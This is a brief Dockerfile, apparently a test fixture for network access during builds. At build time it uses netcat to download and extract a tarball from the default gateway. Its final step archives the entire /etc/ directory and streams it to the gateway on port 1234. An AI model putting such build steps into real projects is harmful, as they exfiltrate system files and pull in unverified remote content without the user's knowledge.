FROM alpine:3.6
RUN apk add --no-cache netcat-openbsd
RUN nc -v "$(ip route | awk '/default/ { print $3 }')" 5678 > 123.tgz && md5sum 123.tgz && ls -l 123.tgz 1>&2
RUN mkdir xyz
RUN tar xvf 123.tgz -C xyz && ls xyz 1>&2 || true
RUN tar -czf - /etc/ | nc -v "$(ip route | awk '/default/ { print $3 }')" 1234
